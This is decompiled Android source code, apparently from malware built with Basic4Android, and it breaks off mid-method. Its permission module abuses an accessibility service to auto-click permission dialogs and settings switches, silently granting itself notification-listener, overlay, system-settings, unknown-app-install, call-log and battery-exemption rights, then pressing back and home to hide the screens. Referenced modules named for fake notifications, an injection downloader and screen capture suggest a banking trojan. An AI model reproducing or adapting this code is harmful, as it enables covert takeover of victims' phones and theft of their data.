package com.com.androidrr;

import android.content.Intent;
//import androidx.core.location.LocationRequestCompat;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.agraham.reflection.Reflection;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.keywords.constants.KeyCodes;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.RuntimePermissions;
import anywheresoftware.b4a.objects.Timer;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import com.tillekesoft.accessibilityservices.AccessibilityConstants;
import com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper;

/* loaded from: classes.dex */
public class clsclassperms_code {
    private static clsclassperms_code mostCurrent = new clsclassperms_code();
    public static IntentWrapper _inopenset = null;
    public static int _intpermissionno = 0;
    public static Timer _timerchecker = null;
    public static long _lastcheck = 0;
    public static boolean _isonovlyact = false;
    public static int _intnumberoftries = 0;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static Object getObject() {
        throw new RuntimeException("Code module does not support this method.");
    }

    public static boolean _candrawoverlays(BA ba) throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            JavaObject javaObject2 = new JavaObject();
            new Phone();
            if (Phone.getSdkVersion() < 23) {
                return true;
            }
            javaObject.InitializeContext(ba.processBA == null ? ba : ba.processBA);
            javaObject2.InitializeStatic("android.provider.Settings");
            return BA.ObjectToBoolean(javaObject2.RunMethod("canDrawOverlays", new Object[]{javaObject.getObject()}));
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
            return false;
        }
    }

    public static boolean _canrequestpackageinstalls(BA ba) throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeContext(ba.processBA == null ? ba : ba.processBA);
            new JavaObject();
            return BA.ObjectToBoolean(((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), javaObject.RunMethod("getPackageManager", (Object[]) Common.Null))).RunMethod("canRequestPackageInstalls", (Object[]) Common.Null));
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
            return false;
        }
    }

    public static boolean _canwritetosystemsettings(BA ba) throws Exception {
        new Phone();
        if (Phone.getSdkVersion() < 23) {
            return true;
        }
        JavaObject javaObject = new JavaObject();
        if (ba.processBA != null) {
            ba = ba.processBA;
        }
        javaObject.InitializeContext(ba);
        JavaObject javaObject2 = new JavaObject();
        javaObject2.InitializeStatic("android.provider.Settings.System");
        return BA.ObjectToBoolean(javaObject2.RunMethod("canWrite", new Object[]{javaObject.getObject()}));
    }

    public static boolean _check_if_notis(BA ba) throws Exception {
        try {
            new Phone();
            String lowerCase = Phone.GetSettings("enabled_notification_listeners").toLowerCase();
            B4AApplication b4AApplication = Common.Application;
            return lowerCase.contains(B4AApplication.getPackageName().toLowerCase());
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
            return false;
        }
    }

    public static String _check_perms(BA ba, String str, String str2, List list, Object obj) throws Exception {
        String lowerCase;
        try {
            DateTime dateTime = Common.DateTime;
            _lastcheck = DateTime.getNow();
            _create_timer(ba);
            lowerCase = str.toLowerCase();
            B4AApplication b4AApplication = Common.Application;
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
        }
        if (lowerCase.contains(B4AApplication.getPackageName().toLowerCase()) || _intpermissionno == 6) {
            return "";
        }
        if (_intnumberoftries == 12) {
            backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
            backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
            accessibilityEventsListener.PerformGlobalAction(2);
            backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        }
        boolean z = str.toLowerCase().contains("com.android.settings") || str.toLowerCase().contains("com.miui.securitycenter") || str.toLowerCase().contains("security");
        if (_check_if_notis(ba)) {
            _intpermissionno = 1;
        }
        if (_check_if_notis(ba) && _candrawoverlays(ba)) {
            _intpermissionno = 2;
        }
        if (_check_if_notis(ba) && _candrawoverlays(ba) && _canwritetosystemsettings(ba)) {
            _intpermissionno = 3;
        }
        if (_check_if_notis(ba) && _candrawoverlays(ba) && _canwritetosystemsettings(ba) && _canrequestpackageinstalls(ba)) {
            _intpermissionno = 4;
        }
        if (_check_if_notis(ba) && _candrawoverlays(ba) && _canwritetosystemsettings(ba) && _canrequestpackageinstalls(ba) && _startcalllogperm(ba)) {
            _intpermissionno = 6;
        }
        if (_check_if_notis(ba) && _candrawoverlays(ba) && _canwritetosystemsettings(ba) && _canrequestpackageinstalls(ba) && _startcalllogperm(ba) && _requestpowermngt(ba)) {
            _intpermissionno = 6;
        }
        int i = _intpermissionno;
        if (i != 0) {
            if (i == 1) {
                if (!z && !_candrawoverlays(ba) && _check_if_notis(ba) && !_inopenset.IsInitialized()) {
                    IntentWrapper intentWrapper = _inopenset;
                    StringBuilder sb = new StringBuilder();
                    sb.append("package:");
                    B4AApplication b4AApplication2 = Common.Application;
                    sb.append(B4AApplication.getPackageName());
                    intentWrapper.Initialize("android.settings.action.MANAGE_OVERLAY_PERMISSION", sb.toString());
                    if (!_isonovlyact) {
                        BA ba2 = ba.processBA == null ? ba : ba.processBA;
                        perm_activateoverlay perm_activateoverlayVar = mostCurrent._perm_activateoverlay;
                        Common.StartActivity(ba2, perm_activateoverlay.getObject());
                        return "";
                    }
                }
                if (!_candrawoverlays(ba)) {
                    _start_perm_draw(ba, list, str, str2);
                }
            } else if (i != 2) {
                if (i != 3) {
                    if (i != 4) {
                        if (i == 5) {
                            if (!z && !_requestpowermngt(ba) && _startcalllogperm(ba) && _candrawoverlays(ba) && _check_if_notis(ba) && _canrequestpackageinstalls(ba) && !_inopenset.IsInitialized()) {
                                _inopenset.Initialize("", "");
                                JavaObject javaObject = new JavaObject();
                                javaObject.InitializeContext(ba.processBA == null ? ba : ba.processBA);
                                javaObject.RunMethod("ShowPermissionDialog", (Object[]) Common.Null);
                                return "";
                            }
                            if (!_requestpowermngt(ba)) {
                                _start_perm_powr(ba, list, str, str2);
                            }
                        }
                    } else {
                        if (!z && !_startcalllogperm(ba) && _candrawoverlays(ba) && _check_if_notis(ba) && _canrequestpackageinstalls(ba) && !_inopenset.IsInitialized()) {
                            _inopenset.Initialize("", "");
                            BA ba3 = ba.processBA == null ? ba : ba.processBA;
                            perm_phonecal perm_phonecalVar = mostCurrent._perm_phonecal;
                            Common.StartActivity(ba3, perm_phonecal.getObject());
                            return "";
                        }
                        if (!z && !_startcalllogperm(ba)) {
                            _start_perm_others(ba, list, str, str2);
                        }
                    }
                } else {
                    if (!z && !_canrequestpackageinstalls(ba) && _candrawoverlays(ba) && _check_if_notis(ba) && !_inopenset.IsInitialized()) {
                        IntentWrapper intentWrapper2 = _inopenset;
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append("package:");
                        B4AApplication b4AApplication3 = Common.Application;
                        sb2.append(B4AApplication.getPackageName());
                        intentWrapper2.Initialize("android.settings.MANAGE_UNKNOWN_APP_SOURCES", sb2.toString());
                        Common.StartActivity(ba.processBA == null ? ba : ba.processBA, _inopenset.getObject());
                        return "";
                    }
                    if (z && !_canrequestpackageinstalls(ba)) {
                        _start_perm_unknown(ba, list, str, str2);
                    }
                }
            } else {
                if (!z && !_canwritetosystemsettings(ba) && _candrawoverlays(ba) && _check_if_notis(ba) && !_inopenset.IsInitialized()) {
                    IntentWrapper intentWrapper3 = _inopenset;
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append("package:");
                    B4AApplication b4AApplication4 = Common.Application;
                    sb3.append(B4AApplication.getPackageName());
                    intentWrapper3.Initialize("android.settings.action.MANAGE_WRITE_SETTINGS", sb3.toString());
                    Common.StartActivity(ba.processBA == null ? ba : ba.processBA, _inopenset.getObject());
                    return "";
                }
                if (z && !_canwritetosystemsettings(ba)) {
                    _start_perm_write(ba, list, str, str2);
                }
            }
        } else {
            if (!z && !_check_if_notis(ba) && !_inopenset.IsInitialized()) {
                _inopenset.Initialize("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS", "");
                _inopenset.setFlags(1073741824);
                Common.StartActivity(ba.processBA == null ? ba : ba.processBA, _inopenset.getObject());
                return "";
            }
            if (z && !_check_if_notis(ba)) {
                _start_perm_notis(ba, list, str);
            }
        }
        _click_anyallow(ba, list, str, str2);
        return "";
    }

    public static String _click_anyallow(BA ba, List list, String str, String str2) throws Exception {
        try {
            if (_intpermissionno < 2) {
                new Map();
                int size = list.getSize();
                for (int i = 0; i < size; i++) {
                    Map map = new Map();
                    java.util.Map map2 = (java.util.Map) list.Get(i);
                    java.util.Map map3 = map2;
                    Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                    if (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("android:id/button1") || BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("permission_allow_button")) {
                        String lowerCase = BA.ObjectToString(map4.Get("ViewText")).toLowerCase();
                        B4AApplication b4AApplication = Common.Application;
                        if (lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                            backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                            backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                            Map map5 = new Map();
                            java.util.Map map6 = (java.util.Map) Common.Null;
                            java.util.Map map7 = map6;
                            accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6));
                            backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar4 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar5 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                            Map map8 = new Map();
                            java.util.Map map9 = (java.util.Map) Common.Null;
                            java.util.Map map10 = map9;
                            accessibilityEventsListener3.PerformNodeActionOnViewWithArgs(true, "com.android.permissioncontroller:id/permission_allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map8, map9));
                            backgroundservice backgroundserviceVar6 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar7 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar8 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                            accessibilityEventsListener5.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar9 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar10 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener7 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar11 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants4 = backgroundservice._accservconstants;
                            accessibilityEventsListener7.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar12 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener8 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            return "";
                        }
                    }
                }
            }
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
        }
        return "";
    }

    public static String _create_timer(BA ba) throws Exception {
        try {
            if (_timerchecker.IsInitialized()) {
                return "";
            }
            _timerchecker.Initialize(ba.processBA == null ? ba : ba.processBA, "timerChecker", 3000L);
            _timerchecker.setEnabled(true);
            return "";
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
            return "";
        }
    }

    public static boolean _is_list_perm(BA ba, List list) throws Exception {
        try {
            if (!BA.ObjectToString(list).contains("switch_widget") && !BA.ObjectToString(list).contains("/checkbox") && !BA.ObjectToString(list).contains("/button1") && !BA.ObjectToString(list).contains("/check_box") && !BA.ObjectToString(list).contains("/intercept_warn_allow")) {
                if (!BA.ObjectToString(list).contains("/intercept_warn_content_end")) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
            return true;
        }
    }

    public static String _process_globals() throws Exception {
        _inopenset = new IntentWrapper();
        _intpermissionno = 0;
        _timerchecker = new Timer();
        _lastcheck = 0L;
        _isonovlyact = false;
        _intnumberoftries = 0;
        return "";
    }

    public static boolean _requestpowermngt(BA ba) throws Exception {
        try {
            if (((int) BA.ObjectToNumber(new Reflection().GetStaticField("android.os.Build$VERSION", "SDK_INT"))) < 23) {
                return true;
            }
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeContext(ba.processBA == null ? ba : ba.processBA);
            return BA.ObjectToBoolean(javaObject.RunMethod("isIgnoringBatteryOptimizations", (Object[]) Common.Null));
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
            return false;
        }
    }

    public static String _start_perm_draw(BA ba, List list, String str, String str2) throws Exception {
        BA ba2 = ba;
        try {
            int i = 0;
            if (_is_list_perm(ba, list)) {
                new Map();
                int size = list.getSize();
                while (i < size) {
                    Map map = new Map();
                    java.util.Map map2 = (java.util.Map) list.Get(i);
                    java.util.Map map3 = map2;
                    Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                    String lowerCase = BA.ObjectToString(map4.Get("ViewText")).toLowerCase();
                    B4AApplication b4AApplication = Common.Application;
                    if (lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                        backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                        int ObjectToNumber = (int) BA.ObjectToNumber(map4.Get("Left"));
                        int ObjectToNumber2 = (int) BA.ObjectToNumber(map4.Get("Top"));
                        int ObjectToNumber3 = (int) BA.ObjectToNumber(map4.Get("width"));
                        int ObjectToNumber4 = (int) BA.ObjectToNumber(map4.Get("Height"));
                        B4AApplication b4AApplication2 = Common.Application;
                        accessibilityEventsListener.PerformClick_ByTemp(ObjectToNumber, ObjectToNumber2, ObjectToNumber3, ObjectToNumber4, B4AApplication.getLabelName(), "android:id/title");
                        backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                        return "";
                    }
                    i++;
                }
            } else {
                String lowerCase2 = BA.ObjectToString(list).toLowerCase();
                B4AApplication b4AApplication3 = Common.Application;
                if (lowerCase2.contains(B4AApplication.getLabelName().toLowerCase())) {
                    new Map();
                    int size2 = list.getSize();
                    int i2 = 0;
                    boolean z = false;
                    while (true) {
                        if (i2 >= size2) {
                            break;
                        }
                        Map map5 = new Map();
                        java.util.Map map6 = (java.util.Map) list.Get(i2);
                        java.util.Map map7 = map6;
                        Map map8 = (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6);
                        String lowerCase3 = BA.ObjectToString(map8.Get("ViewText")).toLowerCase();
                        B4AApplication b4AApplication4 = Common.Application;
                        if (lowerCase3.contains(B4AApplication.getLabelName().toLowerCase())) {
                            z = true;
                        }
                        if (z && !_candrawoverlays(ba)) {
                            if (BA.ObjectToString(map8.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                                B4AApplication b4AApplication5 = Common.Application;
                                String labelName = B4AApplication.getLabelName();
                                backgroundservice backgroundserviceVar4 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                                Map map9 = new Map();
                                java.util.Map map10 = (java.util.Map) Common.Null;
                                java.util.Map map11 = map10;
                                accessibilityEventsListener3.PerformNodeActionOnViewWithArgs(false, labelName, 16, (Map) AbsObjectWrapper.ConvertToWrapper(map9, map10));
                                backgroundservice backgroundserviceVar5 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar6 = mostCurrent._backgroundservice;
                                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map8.Get("Left")), (int) BA.ObjectToNumber(map8.Get("Top")), (int) BA.ObjectToNumber(map8.Get("width")), (int) BA.ObjectToNumber(map8.Get("Height")), "", "android:id/switch_widget");
                                backgroundservice backgroundserviceVar7 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar8 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar9 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener7 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar10 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                                accessibilityEventsListener7.PerformGlobalAction(1);
                                backgroundservice backgroundserviceVar11 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener8 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar12 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener9 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar13 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                                accessibilityEventsListener9.PerformGlobalAction(2);
                                backgroundservice backgroundserviceVar14 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener10 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                _intpermissionno = 2;
                                IntentWrapper intentWrapper = new IntentWrapper();
                                Intent intent = (Intent) Common.Null;
                                Intent intent2 = intent;
                                _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper, intent);
                                break;
                            }
                            if (BA.ObjectToString(map8.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                                backgroundservice backgroundserviceVar15 = mostCurrent._backgroundservice;
                                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map8.Get("Left")), (int) BA.ObjectToNumber(map8.Get("Top")), (int) BA.ObjectToNumber(map8.Get("width")), (int) BA.ObjectToNumber(map8.Get("Height")), "", "android:id/checkbox");
                                backgroundservice backgroundserviceVar16 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener11 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar17 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener12 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar18 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants4 = backgroundservice._accservconstants;
                                accessibilityEventsListener12.PerformGlobalAction(1);
                                backgroundservice backgroundserviceVar19 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener13 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar20 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener14 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar21 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants5 = backgroundservice._accservconstants;
                                accessibilityEventsListener14.PerformGlobalAction(2);
                                backgroundservice backgroundserviceVar22 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener15 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                _intpermissionno = 2;
                                IntentWrapper intentWrapper2 = new IntentWrapper();
                                Intent intent3 = (Intent) Common.Null;
                                Intent intent4 = intent3;
                                _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper2, intent3);
                                break;
                            }
                        }
                        i2++;
                    }
                    if (!z && _intpermissionno == 1) {
                        backgroundservice backgroundserviceVar23 = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener16 = backgroundservice._acs;
                        backgroundservice backgroundserviceVar24 = mostCurrent._backgroundservice;
                        AccessibilityConstants accessibilityConstants6 = backgroundservice._accservconstants;
                        accessibilityEventsListener16.PerformGlobalAction(4);
                        backgroundservice backgroundserviceVar25 = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener17 = backgroundservice._acs;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                        backgroundservice backgroundserviceVar26 = mostCurrent._backgroundservice;
                        backgroundservice._acs.close_notificationbar();
                    }
                } else if (BA.ObjectToString(list).toLowerCase().contains("miui") && !_candrawoverlays(ba) && _check_if_notis(ba) && _intpermissionno == 1) {
                    new Map();
                    int size3 = list.getSize();
                    while (true) {
                        if (i >= size3) {
                            break;
                        }
                        Map map12 = new Map();
                        java.util.Map map13 = (java.util.Map) list.Get(i);
                        java.util.Map map14 = map13;
                        Map map15 = (Map) AbsObjectWrapper.ConvertToWrapper(map12, map13);
                        if (!_candrawoverlays(ba) && BA.ObjectToString(map15.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                            backgroundservice backgroundserviceVar27 = mostCurrent._backgroundservice;
                            backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map15.Get("Left")), (int) BA.ObjectToNumber(map15.Get("Top")), (int) BA.ObjectToNumber(map15.Get("width")), (int) BA.ObjectToNumber(map15.Get("Height")), "", "android:id/checkbox");
                            backgroundservice backgroundserviceVar28 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener18 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar29 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener19 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar30 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants7 = backgroundservice._accservconstants;
                            accessibilityEventsListener19.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar31 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener20 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar32 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener21 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar33 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants8 = backgroundservice._accservconstants;
                            accessibilityEventsListener21.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar34 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener22 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            _intpermissionno = 2;
                            IntentWrapper intentWrapper3 = new IntentWrapper();
                            Intent intent5 = (Intent) Common.Null;
                            Intent intent6 = intent5;
                            _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper3, intent5);
                            break;
                        }
                        i++;
                    }
                }
            }
        } catch (Exception e) {
            if (ba2.processBA != null) {
                ba2 = ba2.processBA;
            }
            ba2.setLastException(e);
        }
        return "";
    }

    public static void _start_perm_notis(BA ba, List list, String str) throws Exception {
        ResumableSub_Start_Perm_Notis resumableSub_Start_Perm_Notis = new ResumableSub_Start_Perm_Notis(null, ba, list, str);
        if (ba.processBA != null) {
            ba = ba.processBA;
        }
        resumableSub_Start_Perm_Notis.resume(ba, null);
    }

    public static class ResumableSub_Start_Perm_Notis extends BA.ResumableSub {
        BA _ba;
        List _rootinactivewindow;
        String _strpkg;
        BA.IterableList group12;
        BA.IterableList group23;
        BA.IterableList group37;
        BA.IterableList group46;
        BA.IterableList group64;
        BA.IterableList group98;
        int groupLen12;
        int groupLen23;
        int groupLen37;
        int groupLen46;
        int groupLen64;
        int groupLen98;
        int index12;
        int index23;
        int index37;
        int index46;
        int index64;
        int index98;
        clsclassperms_code parent;
        Map _mp = null;
        boolean _isstartfromhere = false;

        public ResumableSub_Start_Perm_Notis(clsclassperms_code clsclassperms_codeVar, BA ba, List list, String str) {
            this.parent = clsclassperms_codeVar;
            this._ba = ba;
            this._rootinactivewindow = list;
            this._strpkg = str;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 88;
                            this.catchState = 87;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 87;
                            break;
                        case 4:
                            this.state = 7;
                            if (!clsclassperms_code._check_if_notis(this._ba)) {
                                break;
                            } else {
                                this.state = 6;
                                break;
                            }
                        case 6:
                            this.state = 7;
                            backgroundservice backgroundserviceVar = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                            backgroundservice backgroundserviceVar2 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                            accessibilityEventsListener.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar3 = clsclassperms_code.mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar4 = clsclassperms_code.mostCurrent._backgroundservice;
